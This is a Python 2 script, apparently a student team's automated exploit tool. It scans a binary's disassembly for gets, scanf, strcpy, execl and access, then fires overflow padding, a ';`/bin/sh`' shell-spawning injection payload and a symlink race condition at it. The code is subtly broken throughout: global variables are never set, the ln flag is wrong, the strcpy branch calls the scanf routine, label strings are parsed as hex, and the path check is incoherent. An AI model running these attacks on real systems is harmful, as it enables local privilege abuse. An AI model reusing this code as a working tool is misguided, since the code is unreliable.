#!/usr/bin/python
import sys
import os
import os.path
from pathlib import Path

alias_create_link = ""
alias_delete_link = ""
file_to_check = '"'


def set_up_toctou_attempt():
    file_to_check = raw_input("Enter file (with path) to try to target")
    exploit = raw_input("Enter exploit file (with path)")
    alias_create_link = "ln -S " + exploit + " " + file_to_check
    alias_delete_link = "rm " + file_to_check
    print "Ready for toctou attempt"


def toctou_attempt():
    if os.path.isfile(file_to_check):
        os.system(alias_delete_link)
    os.system(alias_create_link)


def inject_gets(buffers):
    for buf in buffers:
        buf = int(buf, 16)
        print buf
        gets_exploit(buf)


def inject_scanf(buffers):
    for buf in buffers:
        buf = int(buf, 16)
        print buf
        scanf_exploit(buf)


def inject_strcpy(buffers):
    for buf in buffers:
        buf = int(buf, 16)
        print buf
        strcpy_exploit(buf)


def gets_exploit(buf_size):
    exploit = "\x90" * buf_size
    result = os.system("echo " + exploit + " > exploit.txt && ./" + inputFile + " $(cat exploit.txt)")
    if result != 0:
        print "Success"
    else:
        print "Fail"


def scanf_exploit(buf_size):
    exploit = "1" * buf_size
    result = os.system("echo " + exploit + " > exploit.txt && ./" + inputFile)
    if result != 0:
        print "Success"
    else:
        print "Fail"


def strcpy_exploit(buf_size):
    exploit = "1" * buf_size
    result = os.system("echo " + exploit + " > exploit.txt && ./" + inputFile)
    if result != 0:
        print "Success"
    else:
        print "Fail"


def inject_execl():
    exploit = ";`/bin/sh`"
    os.system("echo " + exploit + " > exploit.txt && ./" + inputFile + " $(cat exploit.txt)")


if len(sys.argv) > 1:
    inputFile = os.path.normpath(sys.argv[1])
else:
    sys.exit("Please pass a file as an argument.")

# Make sure that input passed is not some path to a shell or something
basedir = ""
test_path = (Path(basedir) / inputFile).resolve()
if test_path.parent != Path(basedir).resolve():
    sys.exit("Filename {test_path} is not in {Path(basedir)} directory")

# added access function
vulnerabilities = filter(None, os.popen(
    'objdump -M Intel -d ' + inputFile + ' | grep -oP "(gets|scanf|strcpy|memcpy|printf|system|fgets|gets|execl|access)"').read().split(
    '\n'))
vulnerabilities = list(set(filter(None, vulnerabilities)))

print "Team 7 below is the list of suspected vulnerabilities to look at:\n" + str(vulnerabilities)

# buffers = filter(None,os.popen('objdump -d ' +inputFile+ ' | grep -oP "(?<=buf    .)....(?=,%esp)"').read()).split('\n')
# buffers.sort()
# buffers = list(set(filter(None, buf)))
buffers = os.popen('objdump -d ' + inputFile + ' | grep -P "^<*(?=.*(>:))"').read()
buffers = buffers.split("\n")
buffers = list(filter(lambda x: not "@" in x, buffers))
buffers.sort()
print(buffers)
buffers = list(set(filter(None, buffers)))

for suspect_func in vulnerabilities:

    if suspect_func == "gets":
        inject_gets(buffers)
        break
    elif suspect_func == "scanf":
        inject_scanf(buffers)
        break
    elif suspect_func == "strcpy":
        inject_scanf(buffers)
        break
    elif suspect_func == "execl":
        inject_execl()
        break
    elif suspect_func == "access":
        set_up_toctou_attempt()
        break
    else:
        print "No known vulnerability found"

    print os.popen("gdb -batch -ex " + inputFile + " -ex 'disassemble main' | grep -n call").read()
